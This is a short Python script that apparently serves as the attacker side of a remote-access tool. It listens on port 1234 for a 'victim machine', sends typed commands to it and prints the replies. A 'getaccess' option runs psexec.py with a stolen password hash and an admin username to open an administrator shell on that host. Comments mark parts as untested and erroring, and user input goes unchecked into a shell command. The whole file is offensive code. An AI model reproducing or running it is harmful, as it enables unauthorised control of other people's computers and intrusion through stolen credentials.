import socket
from tokenize import String
import subprocess
from subprocess import call
import os

def connectToMachine():
    hashToEnter = input("Enter the hash received: ")
    userName = input("Enter the name of the user with admin rights: ")
    dir = os.getcwd()
    cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
    proc = subprocess.Popen(cmnd, cwd=dir, shell=True)
    proc.wait() #wait until the process (psexec.py) to finish to continue the normal program

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 1234))
s.listen(5)
clientsocket, address = s.accept()
# now our endpoint knows about the OTHER endpoint.s
print(f"Connection from {address} has been established.")

# Server sends message and waits for reply

# To ensure that the person knows what to use there could be a help option
while True:

    msgToSend = input("Enter your message: ")

    ## NOT TESTED YET ##############################################
    # This should create a new terminal that is connected to the victim machine
    # If the correct account is chosen, this terminal will have admin privileges
    if msgToSend == "getaccess":
        connectToMachine()
    ################################################################
    # Closes the socket and terminates the connection (hopefully) ##
    elif msgToSend == "terminate":
        s.close()
        break
    #################################################################

    clientsocket.send(bytes(msgToSend,"utf-8"))
    #this does not work currently since it gets an error
    msg = clientsocket.recv(2048)
    decodedMsg = msg.decode("utf-8")
    print(decodedMsg)



